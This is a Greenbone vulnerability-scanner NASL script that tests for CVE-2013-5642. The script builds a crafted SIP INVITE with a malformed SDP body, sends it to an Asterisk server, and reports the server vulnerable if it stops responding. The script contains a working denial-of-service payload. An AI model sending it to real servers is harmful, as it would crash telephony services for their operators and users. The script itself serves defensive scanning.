# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:digium:asterisk";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802063");
  script_version("2023-12-19T05:05:25+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-12-19 05:05:25 +0000 (Tue, 19 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-10-28 15:06:58 +0530 (Mon, 28 Oct 2013)");

  script_cve_id("CVE-2013-5642");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Asterisk Products Invalid SDP SIP Channel Driver DoS Vulnerability");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_digium_asterisk_sip_detect.nasl");
  script_mandatory_keys("digium/asterisk/detected");

  script_tag(name:"summary", value:"Asterisk Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send invalid SDP SIP request and check is it vulnerable to DoS or
  not.");

  script_tag(name:"insight", value:"Error within the SIP channel driver when handling a crafted SDP in a
  SIP request.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause a denial
  of service via a crafted SDP in a SIP request.");

  script_tag(name:"affected", value:"Asterisk Open Source 1.8.x to 1.8.23.0, 10.x to 10.12.2 and 11.x to
  11.5.0 Certified Asterisk 1.8.15 to 1.8.15-cert2 and 11.2 to 11.2-cert1 Asterisk Digiumphones
  10.x-digiumphones to 10.12.2-digiumphones");

  script_tag(name:"solution", value:"Upgrade to Asterisk Open Source to 1.8.23.1, 10.12.3, 11.5.1 or
  later, Certified Asterisk to 1.8.15-cert3, 11.2-cert2 or later, Asterisk Digiumphones
  10.12.3-digiumphones or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54534");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62022");
  script_xref(name:"URL", value:"https://issues.asterisk.org/jira/browse/ASTERISK-22007");
  script_xref(name:"URL", value:"http://downloads.asterisk.org/pub/security/AST-2013-005.html");

  exit(0);
}

include("sip.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) )
  exit( 0 );

proto = infos["proto"];
if( ! sip_alive( port:port, proto:proto ) )
  exit( 0 );

host_name = get_host_name();
this_host = this_host();

vtstrings = get_vt_strings();
useragent = vtstrings["default"];

con_data = string("v=0", "\r\n",
                  "o=user1 53655765 2353687637 IN IP4", this_host,"\r\n",
                  "s=-", "\r\n",
                  "t=0 0", "\r\n",
                  "m=audio 6000 RTP/AVP 8 0", "\r\n",
                  "m=video 6002 RTP/AVP 31", "\r\n",
                  "c=IN IP4", this_host);

craf_req = string( "INVITE sip:test@", host_name, ":", port, " SIP/2.0", "\r\n",
                   "Via: SIP/2.0/", toupper( proto ), " ", this_host, ":", port,";branch=z9hG4bK-25912-1-0","\r\n",
                   "From: test1 <sip:guest0@", this_host, ":", port, ";tag=1", "\r\n",
                   "To: test <sip:test@", host_name, ":", port, ">", "\r\n",
                   "Call-ID: 1-25912@", this_host, "\r\n",
                   "CSeq: 1 INVITE", "\r\n",
                   "Contact: sip:guest@", this_host, ":", port, "\r\n",
                   "Max-Forwards: 70", "\r\n",
                   "Subject: DoS Test", "\r\n",
                   "User-Agent: ", useragent, " DoS Test", "\r\n",
                   "Content-Type: application/sdp", "\r\n",
                   "Content-Length:   ", strlen(con_data), "\r\n\r\n",
                   con_data, "\r\n");

sip_send_recv( port:port, data:craf_req, proto:proto );
sleep( 2 );

if( ! sip_alive( port:port, proto:proto ) ) {
  security_message( port:port, proto:proto );
  exit( 0 );
}

exit( 99 );